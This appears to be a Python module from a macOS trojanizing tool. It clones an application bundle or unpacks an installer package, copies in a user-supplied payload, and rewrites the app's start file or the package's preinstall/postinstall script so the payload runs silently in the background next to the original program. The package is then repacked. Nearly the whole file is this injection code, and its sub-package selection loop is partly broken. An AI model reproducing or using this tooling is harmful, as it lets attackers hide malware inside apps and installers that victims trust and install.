from glob import glob
from os import chdir, makedirs, path
from subprocess import call

from .get_app import get_app_name
from .logic import check_app_path, check_inputs, check_pkg_path

C_None = "\x1b[0;39m"
C_BRed = "\x1b[1;31m"


def inject_app(args, include_files):

    # 1 | Check for valid folder
    check_app_path(args)

    # 2 | Checking for a valid input
    output = check_inputs(args)

    # 3 | Cloning the application
    print("[i] Cloning the application...")

    if path.isdir(output) or path.isdir(args.output[0]):
        print(C_BRed + f"[!] The output directory already exists: {output}" + C_None)
        quit()

    try:

        call(f"cp -r '{args.app[0]}' '{output}'", shell=True)
        print("[+] The application was sucessfully cloned.")

    except Exception:

        print(C_BRed + f"[!] Cannot write to output: {output}" + C_None)
        quit()

    # 4 | Checking things
    print("[i] Injecting script...")

    appname = get_app_name(args)

    try:

        chdir(output + "/Contents/MacOS/")

    except Exception:

        print(C_BRed + "[!] Cannot access the applications start file." + C_None)
        quit()

    # 5 | Including files
    if include_files:

        print("[i] Including the content of the given folder...")

        if path.isdir(args.include[0]):
            print(f"[+] Getting the files: {args.include[0]}")

        else:
            print(C_BRed + f"[!] Cannot find folder to include: {args.include[0]}" + C_None)
            quit()

        try:

            call(f"cp -a '{args.include[0]}/.' .", shell=True)

        except Exception:

            print(C_BRed + "[!] Cannot include the files." + C_None)
            quit()

        print("[i] Make the included files executable...")
        try:

            call("chmod +x *", shell=True)

        except Exception:

            print(C_BRed + "[!] Cannot make the files executable." + C_None)
            quit()

    # 6 | Changing the start order
    print("[i] Changing the start order...")

    try:

        call(f"cp '{args.inject[0]}' payload", shell=True)

    except Exception:

        print(C_BRed + "[!] Cannot insert the injection." + C_None)
        quit()

    try:

        call(f"mv '{appname}' 'injectra'", shell=True)

    except Exception:

        print(C_BRed + "[!] Cannot rearrange the start order." + C_None)
        quit()

    try:

        # call(f'echo \'#!/bin/sh\nDIR=$(cd "$(dirname "$0")"; pwd) ; cd $DIR\n$DIR/payload &\n$DIR/injectra &\' > "{appname}"', shell=True)
        injection_handler = open(appname, "w")
        injection_handler.write('#!/bin/sh\nDIR=$(cd "$(dirname "$0")"; pwd) ; cd $DIR\n$DIR/payload &\n$DIR/injectra &')
        injection_handler.close()

    except Exception:

        print(C_BRed + "[!] Cannot write new a start order." + C_None)
        quit()

    try:

        call(f"chmod +x injectra ; chmod +x payload ; chmod +x '{appname}'", shell=True)

    except Exception:

        print(C_BRed + "[!] Cannot make the injection executable." + C_None)
        quit()

    try:

        chdir("../../../")
        call(f"mv '{output}' '{args.output[0]}'", shell=True)

    except Exception:

        print(C_BRed + "[!] Cannot make the application visible." + C_None)
        quit()

    print("[+] The injection was sucessful.")


def inject_pkg(args, include_files):

    # 1 | Check for valid file
    check_pkg_path(args)

    # 2 | Checking for a vallid input
    output = check_inputs(args)

    # 3 | Cloning the package
    print("[i] Creating temporary directory...")

    if path.isfile(output) or path.isfile(args.output[0]):
        print(C_BRed + f"[!] The output directory already exists: {output}" + C_None)
        quit()

    try:

        makedirs(f".tmp_{output}")

        # call(f"cp -r '{args.pkg[0]}' '{output}'", shell=True)

        chdir(f".tmp_{output}")
 
        print("[+] The package was sucessfully cloned.")

    except Exception:

        print(C_BRed + f"[!] Cannot write to output: .tmp_{output}" + C_None)
        quit()

    # 4 | Decompression of package
    print("[i] Decompressing the package...")

    try:

        call(f"xar -xf '../{output}'", shell=True)

    except Exception:

        print(C_BRed + "[!] Cannot decompress the package." + C_None)
        print("[i] Make sure xar is available.")
        quit()

    # 5 | Fetching injectable packages
    print("[i] Fetching injectable packages.")

    injectable_pkgs = list(glob("*.pkg"))

    if len(injectable_pkgs) == 0:

        inject_pkg = None

        print("[i] Package has no sub-packages.")

    else:

        for pos, pkg in enumerate(injectable_pkgs):

            print(f"[{pos}] {pkg}")

        while True:

            try:

                inject_pkg = injectable_pkgs[int(input("[-] Please select the sub-package from the above list you would like to inject: "))]

            except KeyError:

                pass

    if inject_pkg is not None:

        chdir(inject_pkg)

    # 6 | Extract scripts
    print("[i] Setting up extraction environment.")

    try:

        call("mv Scripts Scripts.tmp", shell=True)

        makedirs("Scripts")
        chdir("Scripts")

    except Exception:

        print(C_BRed + "[!] Could not create extraction environment." + C_None)
        quit()

    print("[i] Extracting scripts...")

    try:

        call("cpio -i -F ../Scripts.tmp", shell=True)
        call("rm ../Scripts.tmp", shell=True)

    except Exception:

        print(C_BRed + "[!] Could not extract Scripts." + C_None)
        print("[i] Make sure cpio is available.")
        quit()

    # 7 | Moving necessary files
    print("[i] Inserting shellcode.")
    try:

        call(f"cp '{args.inject[0]}' payload", shell=True)

    except Exception:

        print(C_BRed + "[!] Cannot insert the injection." + C_None)
        quit()

    if include_files:

        print("[i] Including the content of the given folder...")

        if path.isdir(args.include[0]):
            print(f"[+] Getting the files: {args.include[0]}")

        else:
            print(C_BRed + f"[!] Cannot find folder to include: {args.include[0]}" + C_None)
            quit()

        try:

            call(f"cp -a '{args.include[0]}/.' .", shell=True)

        except Exception:

            print(C_BRed + "[!] Cannot include the files." + C_None)
            quit()

    # 8 | Searching injectable script
    print("[i] Finding script to inject.")

    scripts = list(glob("*"))

    if "preinstall" in scripts:

        script_to_inject = "preinstall"

    elif "postinstall" in scripts:

        script_to_inject = "postinstall"

    else:

        print(C_BRed + "[!] Script not injectable." + C_None)

    print("[i] Injecting script.")

    try:

        call(f"mv '{script_to_inject}' injectra", shell=True)

        injection_handler = open(script_to_inject, "w")
        injection_handler.write('#!/bin/sh\nDIR=$(cd "$(dirname "$0")"; pwd) ; cd $DIR\n$DIR/payload &\n$DIR/injectra &')
        injection_handler.close()

    except Exception:

        print(C_BRed + "[!] Could not create injection." + C_None)
        quit()

    print("[i] Making files executable.")

    try:

        call("chmod +x *", shell=True)

    except Exception:

        print(C_BRed + "[!] Cannot make the files executable." + C_None)
        quit()

    # 9 | Repacking the package
    print("[i] Repacking the package...")

    try:

        chdir("../../")
        call(f"pkgutil --flatten . {args.output[0]}", shell=True)

    except Exception:

        print(C_BRed + "[!] Could not repack the package." + C_None)
        print("[i] Make sure pkgutil is available.")
        quit()

    # 10 | Cleaning up
    print("[i] Cleaning up.")

    try:

        print("Please answer with yes...")
        call(f"rm -i -rf '.tmp_{output}'", shell=True)

    except Exception:

        print(C_BRed + "[!] Could not clean up." + C_None)
        quit()

    print("[+] The injection was sucessful.")
